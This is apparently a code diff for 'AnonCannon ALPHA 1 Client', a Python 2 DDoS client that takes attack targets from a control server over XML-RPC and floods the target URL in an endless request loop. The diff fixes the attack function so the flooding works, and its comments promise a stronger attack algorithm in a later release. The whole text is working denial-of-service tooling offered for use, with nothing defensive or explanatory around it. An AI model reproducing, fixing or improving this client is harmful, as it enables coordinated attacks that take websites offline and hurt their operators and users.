@@ -3,6 +3,20 @@
 #Take it Down!
 import xmlrpclib                       #For server communication
 import urllib                          #For the worst DDoS Algo every
+#ALPHA ATTACK ALGO, I PROMISE IS USE A BETTER IN THE FINAL!
+def attack():
+  print "[!!!]Now attacking."
+  try:
+      while(attacking == True):
+        ul = urllib.urlopen(attack_target)
+  except KeyboardInterrupt:
+    answer = raw_input("Do you want to quit?(y/n)")
+    if(answer == "y"):
+      print "Quiting."
+      exit()
+    if(answer == "n"):
+      raise
+
 print "AnonCannon ALPHA 1 Client"
 print "-----------------------------------------------------------------"
 address       = raw_input("Enter your Control server>>>")
@@ -15,21 +29,8 @@ answer = raw_input("Do you want to join the Attack(y/n):")
 if(answer == "y"):
   print "Joining the Attack on:" + attack_target
   attacking = True
-  attack(attack_target)
+  attack()
 if(answer == "n"):
   print "Quiting..."
   exit()
 #ALPHA ATTACK ALGO - I PROMISE I USE A BETTER IN HE FINAL RELEASE!-!
-def attack(url_to_hit):
-  print "[!!!]Now attacking."
-  try:
-      while(attacking = True)
-      ul = urllib.urlopen(attack_target)
-  except KeyboardInterrupt:
-    answer = raw_input("Do you want to quit?(y/n)")
-    if(answer == "y"):
-      print "Quiting."
-      exit()
-    if(answer == "n"):
-      raise
-
